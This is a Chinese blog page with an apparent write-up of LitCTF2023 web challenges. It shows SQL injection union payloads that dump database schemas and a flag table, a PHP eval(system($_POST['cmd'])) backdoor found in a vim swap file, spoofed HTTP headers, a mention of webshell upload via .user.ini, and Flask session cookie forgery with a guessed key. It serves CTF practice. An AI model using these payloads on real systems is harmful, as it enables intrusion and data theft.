@@ -1,0 +1,270 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>litctf2023 | Rose's Blog</title><meta name="author" content="Rose"><meta name="copyright" content="Rose"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="LitCTF2023总结：题目很基础，有些题一言难尽。还是太菜了，做题做少了。多多刷题！！ 但是还有收获的，思路，xff的替代，sql 爆库 ，session伪造。 我flag呢？查看源码即可。 扫描得到路径即可。  ping12345678910function check_ip()&amp;#123;    let ip &#x3D; document.getElementById(&amp;#x27;command&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="litctf2023">
+<meta property="og:url" content="https://rosewwwfr.github.io/web/wp/Litctf2023%20(copy)/index.html">
+<meta property="og:site_name" content="Rose&#39;s Blog">
+<meta property="og:description" content="LitCTF2023总结：题目很基础，有些题一言难尽。还是太菜了，做题做少了。多多刷题！！ 但是还有收获的，思路，xff的替代，sql 爆库 ，session伪造。 我flag呢？查看源码即可。 扫描得到路径即可。  ping12345678910function check_ip()&amp;#123;    let ip &#x3D; document.getElementById(&amp;#x27;command&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rose-1317018836.cos.ap-guangzhou.myqcloud.com/9b48ce68bf64b3cc93f2b9cd0a956cfd.jpg">
+<meta property="article:published_time" content="2023-05-16T07:51:03.374Z">
+<meta property="article:modified_time" content="2023-05-16T11:54:55.448Z">
+<meta property="article:author" content="Rose">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rose-1317018836.cos.ap-guangzhou.myqcloud.com/9b48ce68bf64b3cc93f2b9cd0a956cfd.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://rosewwwfr.github.io/web/wp/Litctf2023%20(copy)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'litctf2023',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-16 19:54:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://rose-1317018836.cos.ap-guangzhou.myqcloud.com/9b48ce68bf64b3cc93f2b9cd0a956cfd.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://rose-1317018836.cos.ap-guangzhou.myqcloud.com/cd658d81c36ef6e28c802c81531762be.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="Rose's Blog"><span class="site-name">Rose's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">litctf2023</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-16T07:51:03.374Z" title="发表于 2023-05-16 15:51:03">2023-05-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-16T11:54:55.448Z" title="更新于 2023-05-16 19:54:55">2023-05-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/wp/">wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="litctf2023"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="LitCTF2023"><a href="#LitCTF2023" class="headerlink" title="LitCTF2023"></a>LitCTF2023</h1><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>题目很基础，有些题一言难尽。还是太菜了，做题做少了。多多刷题！！</p>
+<p>但是还有收获的，思路，xff的替代，sql 爆库 ，session伪造。</p>
+<h2 id="我flag呢？"><a href="#我flag呢？" class="headerlink" title="我flag呢？"></a>我flag呢？</h2><p>查看源码即可。<img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515122817494.png" alt="image-20230515122817494"></p>
+<p>扫描得到路径即可。</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230516154926010.png" alt="image-20230516154926010"></p>
+<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function check_ip()&#123;</span><br><span class="line">    let ip = document.getElementById(<span class="string">&#x27;command&#x27;</span>).value;</span><br><span class="line">    let re = /^(<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]\d|[<span class="number">0</span>-<span class="number">1</span>]\d&#123;<span class="number">2</span>&#125;|[<span class="number">1</span>-<span class="number">9</span>]?\d)\.(<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]\d|[<span class="number">0</span>-<span class="number">1</span>]\d&#123;<span class="number">2</span>&#125;|[<span class="number">1</span>-<span class="number">9</span>]?\d)\.(<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]\d|[<span class="number">0</span>-<span class="number">1</span>]\d&#123;<span class="number">2</span>&#125;|[<span class="number">1</span>-<span class="number">9</span>]?\d)\.(<span class="number">25</span>[<span class="number">0</span>-<span class="number">5</span>]|<span class="number">2</span>[<span class="number">0</span>-<span class="number">4</span>]\d|[<span class="number">0</span>-<span class="number">1</span>]\d&#123;<span class="number">2</span>&#125;|[<span class="number">1</span>-<span class="number">9</span>]?\d)$/;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(re.test(ip.trim()))&#123;</span><br><span class="line">      <span class="keyword">return</span> true;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">&#x27;敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> false;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>真的太蠢了，这种禁用，没发现是前端校验的。直接抓包修改就好了。</p>
+<p>为何是前端 ，从返回true 应该会知道的。</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515122651348.png" alt="image-20230515122651348"></p>
+<h2 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h2><p>发现解密加密点击上面的就行了，但是还有个RUN CODE 没用到。</p>
+<p>试一下代码执行结果真能。</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515123224488.png" alt="image-20230515123224488"></p>
+<h2 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h2><p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515125455403.png" alt="image-20230515125455403"></p>
+<p>备份文件还有好吃的，大概就是彩蛋，扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirmap.py -i http://node1.anna.nssctf.cn:28975 -lcf</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515130042031.png" alt="image-20230515130042031"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        // 第三个彩蛋！(看过头号玩家么？)</span><br><span class="line">        // _R3ady_Pl4yer_000ne_ (3/?)</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="vim-yyds"><a href="#vim-yyds" class="headerlink" title="vim yyds"></a>vim yyds</h2><p>.index.php.swp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));          </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;          </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>))</span><br><span class="line">&#123; <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;         </span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>;  </span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515130640356.png" alt="image-20230515130640356"></p>
+<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>没有过滤，直接闭合，然后查询</p>
+<p>查库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select group_concat(schema_name),2 from information_schema.schemata %23</span><br></pre></td></tr></table></figure>
+
+<p>查表：（已经知道flag 在ctftraining里头。）ctf 里头是假的。F1rst_to_Th3_eggggggggg!}(彩蛋)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;ctftraining&#x27;%23</span><br><span class="line"></span><br><span class="line">flag,news,users</span><br></pre></td></tr></table></figure>
+
+<p>查字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1)))))) union select group_concat(column_name),2 from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=&#x27;ctftraining&#x27;%23 //这里需要查不是当前数据库的表。</span><br></pre></td></tr></table></figure>
+
+<p>查内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select 1,flag from ctftraining.flag%23 </span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515133902290.png" alt="image-20230515133902290"></p>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>是个有用的题。</p>
+<p>本地访问，只能想到xxf </p>
+<p>但是他说好垃圾</p>
+<p>我找了别的都没有反应。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">本地访问 ：</span><br><span class="line">不能用 xff 用了  client-ip: 127.0.0.1</span><br><span class="line">---》You are not from pornhub.com !</span><br><span class="line"></span><br><span class="line">来个 referer:pornhub.com</span><br><span class="line">---&gt; 用Chrome浏览器啊!</span><br><span class="line"></span><br><span class="line">来个 user-agent: Chrome</span><br><span class="line">---&gt;不开代理你想上p站？ 代理服务器地址是Clash.win</span><br><span class="line"></span><br><span class="line">来个 via: Clash.win  （这个是刚刚知道的）</span><br><span class="line">---》借一步说话—&gt;&gt; /wtfwtfwtfwtf.php</span><br><span class="line"></span><br><span class="line">然后访问这个，看到跳转连接，dddd</span><br><span class="line">查看源码 ，访问sejishikong.php</span><br><span class="line">得到flag.</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h2><p>就是文件上传</p>
+<p>.user.ini 即可</p>
+<p>太菜了！！！</p>
+<p>但是好像只要 创建木马文件就行了。。。。</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515132505547.png" alt="image-20230515132505547"></p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515132514809.png" alt="image-20230515132514809"></p>
+<p>彩蛋：</p>
+<p>有个连接 <a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/My_pic/blob/main/demo.jpg%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%B0%B1%E6%89%BE%E5%88%B0%E4%BA%86%E3%80%82">https://github.com/ProbiusOfficial/My_pic/blob/main/demo.jpg，访问就找到了。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wow 你找到了第二个彩蛋哦~</span><br><span class="line">_S0_ne3t? (2/?)</span><br></pre></td></tr></table></figure>
+
+<h2 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h2><p>社工题！666</p>
+<p>根据提示，应该是找到原始的未脱敏的数据。给了个博客链接，于是找，文章应该是脱敏后的，去GitHub找。</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515134859109.png" alt="image-20230515134859109"></p>
+<p>然后修改 为NSSCTF即可。</p>
+<h2 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h2><p>隐隐知道是js</p>
+<p>要找游戏结束的那个地方的代码。</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515122141171.png" alt="image-20230515122141171"></p>
+<h2 id="flag点击就送"><a href="#flag点击就送" class="headerlink" title="flag点击就送"></a>flag点击就送</h2><p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515135053247.png" alt="image-20230515135053247"></p>
+<p>于是 访问 hello post 一个admin</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515135129854.png" alt="image-20230515135129854"></p>
+<p>用wappalzer查看</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515232034320.png" alt="image-20230515232034320"></p>
+<p>有个flask ，想到session伪造。</p>
+<p>但是  密钥呢！！！！！！为啥是 LitCTF </p>
+<p>找到session ，不想解码了，直接base64看看。<img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515232206026.png" alt="image-20230515232206026"></p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515232500158.png" alt="image-20230515232500158"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">显然是要改成这样的&#123;&quot;name&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以需要 加密</p>
+<p>密钥看是“LitCTF”,只能说不知道怎么知道的。</p>
+<p>pyload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;LitCTF&quot; -t &quot;&#123;&#x27;name&#x27;:&#x27;admin&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJuYW1lIjoiYWRtaW4ifQ.ZGMWTQ.v1Tkmf65H7OylDBTdSYE2arz2kU</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230516135125607.png" alt="image-20230516135125607"></p>
+<p>报错了很久，才发现是payload错误，json格式要用单引号。</p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515233148782.png" alt="image-20230515233148782"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;fd2220ea-89c9-4a18-a13a-8bc5b531765e&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p>进来是个魔方。</p>
+<p>然后查看源码，有个 <code>/dist/index.umd.js</code></p>
+<p>访问，眼尖一点，可以看到  &#x2F;<a href="mailto:&#102;&#x40;&#x6b;&#51;&#102;&#x31;&#97;&#103;&#46;&#112;&#x68;&#x70;">&#102;&#x40;&#x6b;&#51;&#102;&#x31;&#97;&#103;&#46;&#112;&#x68;&#x70;</a></p>
+<p><img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515140025212.png" alt="image-20230515140025212"></p>
+<p>访问得到：<img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515140109786.png" alt="image-20230515140109786"></p>
+<p>知道是jsfuck编码，解码得到。<img src="C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20230515140139848.png" alt="image-20230515140139848"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删掉中括号即可。</span><br><span class="line">NSSCTF&#123;c1052346-8cab-477e-9f0d-00928ef552dd&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>第一个彩蛋有点难找</p>
+<p>LitCTF{First_t0_The_k3y!</p>
+<p> &#x2F;&#x2F; 第三个彩蛋！(看过头号玩家么？)<br>        &#x2F;&#x2F; <em>R3ady_Pl4yer_000ne</em> (3&#x2F;?)</p>
+<p>F1rst_to_Th3_eggggggggg!}</p>
+<p>wow 你找到了第二个彩蛋哦~<br>_S0_ne3t? (2&#x2F;?)</p>
+<p>最终得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://rosewwwfr.github.io">Rose</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://rosewwwfr.github.io/web/wp/Litctf2023%20(copy)/">https://rosewwwfr.github.io/web/wp/Litctf2023%20(copy)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://rosewwwfr.github.io" target="_blank">Rose's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="social-share" data-image="https://rose-1317018836.cos.ap-guangzhou.myqcloud.com/9b48ce68bf64b3cc93f2b9cd0a956cfd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/web/rce/rce%E6%80%BB%E7%BB%93-1%20(copy)/" title="rce-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">rce-1</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://rose-1317018836.cos.ap-guangzhou.myqcloud.com/9b48ce68bf64b3cc93f2b9cd0a956cfd.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rose</div><div class="author-info__description">今日事，今日毕</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LitCTF2023"><span class="toc-number">1.</span> <span class="toc-text">LitCTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91flag%E5%91%A2%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">我flag呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ping"><span class="toc-number">1.3.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toc-number">1.4.</span> <span class="toc-text">php是世界上最好的语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Follow-me-and-hack-me"><span class="toc-number">1.5.</span> <span class="toc-text">Follow me and hack me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vim-yyds"><span class="toc-number">1.6.</span> <span class="toc-text">vim yyds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql"><span class="toc-number">1.7.</span> <span class="toc-text">sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Http"><span class="toc-number">1.8.</span> <span class="toc-text">Http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.9.</span> <span class="toc-text">作业管理系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%B1%E5%BD%93%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F"><span class="toc-number">1.10.</span> <span class="toc-text">就当无事发生</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span 